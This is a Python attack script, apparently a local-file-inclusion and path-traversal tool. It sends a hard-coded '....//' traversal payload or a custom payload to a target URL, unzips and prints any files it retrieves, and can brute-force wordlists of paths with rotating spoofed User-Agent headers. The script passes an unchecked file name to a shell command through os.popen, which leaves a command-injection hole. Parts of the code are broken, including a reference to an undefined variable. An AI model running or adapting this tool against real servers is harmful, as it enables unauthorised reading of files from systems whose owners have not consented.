import requests
import random
import os
import zipfile
import asyncio
import time
import aiohttp
from aiohttp.client import ClientSession
import io
import os
import argparse
#from aiomisc import *
from urllib.parse import urlparse
parser = argparse.ArgumentParser(description='Download and extract a zip file from a URL')
parser.add_argument('-p','--path', help='final path from payload', required=False)
parser.add_argument('-u', '--url', help='Target URL', required=True)
parser.add_argument('-lfi', '--payload', help='Custom payload', required=False)
parser.add_argument('-w', '--wordlist', help='a web  wordlist, probably you would not use the path in this case', required=False)
parser.add_argument('-f', '--file', help='local wordlist', required=False)
args = parser.parse_args()
print("""
       ⣴⣶⣤⡤⠦⣤⣀⣤⠆     ⣈⣭⣭⣿⣶⣿⣦⣼⣆         
        ⠉⠻⢿⣿⠿⣿⣿⣶⣦⠤⠄⡠⢾⣿⣿⡿⠋⠉⠉⠻⣿⣿⡛⣦    
              ⠈⢿⣿⣟⠦ ⣾⣿⣿⣷⠄⠄⠄⠄⠻⠿⢿⣿⣧⣄     
               ⣸⣿⣿⢧ ⢻⠻⣿⣿⣷⣄⣀⠄⠢⣀⡀⠈⠙⠿⠄    
              ⢠⣿⣿⣿⠈  ⠡⠌⣻⣿⣿⣿⣿⣿⣿⣿⣛⣳⣤⣀⣀   
       ⢠⣧⣶⣥⡤⢄ ⣸⣿⣿⠘⠄ ⢀⣴⣿⣿⡿⠛⣿⣿⣧⠈⢿⠿⠟⠛⠻⠿⠄  
      ⣰⣿⣿⠛⠻⣿⣿⡦⢹⣿⣷   ⢊⣿⣿⡏  ⢸⣿⣿⡇ ⢀⣠⣄⣾⠄   
     ⣠⣿⠿⠛⠄⢀⣿⣿⣷⠘⢿⣿⣦⡀ ⢸⢿⣿⣿⣄ ⣸⣿⣿⡇⣪⣿⡿⠿⣿⣷⡄  
     ⠙⠃   ⣼⣿⡟  ⠈⠻⣿⣿⣦⣌⡇⠻⣿⣿⣷⣿⣿⣿ ⣿⣿⡇⠄⠛⠻⢷⣄ 
          ⢻⣿⣿⣄   ⠈⠻⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟ ⠫⢿⣿⡆     
           ⠻⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣀⣤⣾⡿⠃     
           """)
def unzip(response):
    zipfile_bytes = io.BytesIO(response.content)
    with zipfile.ZipFile(zipfile_bytes, 'r') as zip_ref:
        for file_name in zip_ref.namelist():
            with zip_ref.open(file_name, 'r') as file:
                print(file.read().decode('utf-8'))

count = 0
def force_counter():
    a = count + 1
    return a
def is_url(url):
    try:
        requests.get(url)
        return True
    except requests.exceptions.MissingSchema:
        return False
def header_sort():
    header = random.randint(0,20)
    return header 
if args.wordlist is not None:
    try:
        #headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
        headers = [{"User-Agent":"Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"},
{"User-Agent":"Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"},
{"User-Agent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"},
{"User-Agent":"Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.3"},
{"User-Agent":"Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"},
{"User-Agent":"Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"},
{"User-Agent":"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"},
{"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15"},
{"User-Agent":"Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3"},
{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"},
{"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"},
{"User-Agent":"Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"},
{"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"},
{"User-Agent":"Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)"},
{"User-Agent":"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"}]
        array=[]
        response_header = []
        header = header_sort()
        content_header = []
        b = is_url(args.wordlist)
        count = 0
        print(b)
        if b == True:
            r = requests.get(args.wordlist)
            #global line_count
            line_count = len(r.text.split('\n'))
        else:
            line_count = os.popen(f'wc -l {args.wordlist}').read()
            r = open(args.wordlist, "r")
        async def download_link(url:str,session:ClientSession,counter):
            async with session.get(url, headers=random.choice(headers)) as response:
                result = await response.read()
                #w = force_counter()
                #if len(result) != 0:
                #line_count = len(r.text.split('\n'))
                #else:
                #line_count = len(r.strip())
               # print(f'Read {len(result)} from {url}')
                #async with counter_lock:
                #    counter += 1
                #print(counter)
                content_length = (len(result.decode('latin-1')))
                os.system("clear")
                print(f"{counter}\{line_count}")
                if content_length != 0:
                    content_header.append(result.decode('latin-1'))
                #print(result.decode('latin-1'))
                if len(result) != 0:
                    array.append(url)
                #if result.decode('latin-1')) !=
                #response_header.append((response.headers.items()))
                #print(response_header)
                if len(response_header) == 0 and response.content != 0:
                    response_header.append(response.headers.items())
        async def download_all(url):
            my_conn = aiohttp.TCPConnector(limit=20)
            async with aiohttp.ClientSession(connector=my_conn) as session:
                tasks = []
                counter = 0
                if b == True:
                    for line in r.iter_lines():
                        task = asyncio.ensure_future(download_link(url=f"{url}{line.decode('utf-8')}",session=session,counter=counter))
                        tasks.append(task)
                        counter += 1
                    await asyncio.gather(*tasks,return_exceptions=True) # the await must be nest inside of the session
                else:
                    for line in r:
                        #print(line, len(line), f"{url}{line}")
                        task = asyncio.ensure_future(download_link(url=f"{url}{line.rstrip()}",session=session,counter=0))
                        tasks.append(task)
                        counter += 1
                    await asyncio.gather(*tasks,return_exceptions=True)
        url_list = args.url
        print(url_list)
        start = time.time()
        asyncio.run(download_all(url_list))
        end = time.time()
        print(f'download {line_count} links in {end - start} seconds')
    except KeyboardInterrupt as e:
        os.system('clear')
        print("=============================================================")

        for a in array:
            print(a.split('\n'))
        if len(array) == 0:
            print("NULL")
        print("=============================================================")
        print(response_header)
        print("============================================================")
    except zipfile.BadZipFile as e:
        print("url is probably not return a zip file, try change tool values for match the payload.\n See below the header response which raise this advise:" )
        for header, value in w.headers.items():
            print(header+ ':', value)
    finally:
        print("==========================================================")
        for b in array:
            print(b.split('\n'))
        print("==========================================================")
        for a in response_header:
            for header, value in a:
                print(f"{header}: {value}")
        print(content_header)
        print("==========================================================")
elif args.payload is not None:
    url = f'{args.url}{args.payload}{args.path}'
    response = requests.get(url)
    unzip(response)
else:
    url = f'{args.url}....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//{args.path}'
    response = requests.get(url)
    unzip(response)
    for header, value in response.headers.items():
        print(f"{header}: {value}")
